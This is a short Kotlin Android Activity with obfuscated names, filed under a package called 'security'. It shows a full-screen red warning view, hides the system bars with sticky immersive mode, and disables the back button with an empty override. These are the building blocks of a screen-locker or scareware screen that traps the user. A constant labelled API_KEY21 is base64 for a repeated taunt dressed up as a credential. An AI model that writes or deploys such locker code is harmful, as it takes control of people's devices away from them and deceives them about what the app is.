package security
import android.app.Activity
import android.graphics.Color
import android.os.Bundle
import android.view.View
import android.widget.TextView
import android.widget.FrameLayout
import android.view.Gravity

class gfkajljbgewf : Activity() {
    val API_KEY21 = "WW91QXJlQUxvc2VyWW91QXJlQUxvc2VyWW91QXJlQUxvc2VyWW91QXJlQUxvc2VyWW91QXJlQUxvc2VyWW91QXJlQUxvc2VyWW91QXJlQUxvc2VyWW91QXJlQUxvc2VyWW91QXJlQUxvc2Vy=="
    override fun onCreate(ngbgreag: Bundle?) {
        super.onCreate(ngbgreag)

        val bgjrkeljgfd = FrameLayout(this).apply {
            setBackgroundColor(Color.RED)

            val warningText = TextView(this@gfkajljbgewf).apply {
                val bgjkrlegfda = "xxxxxxx"
                text = bgjkrlegfda
                setTextColor(Color.WHITE)
                textSize = 20f
                gravity = Gravity.CENTER
                setPadding(40, 40, 40, 40)
            }

            addView(warningText, FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT
            ).apply {
                gravity = Gravity.CENTER
            })
        }

        setContentView(bgjrkeljgfd)

        window.decorView.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_FULLSCREEN or
                        View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                )
    }

    override fun onBackPressed() {
    }
}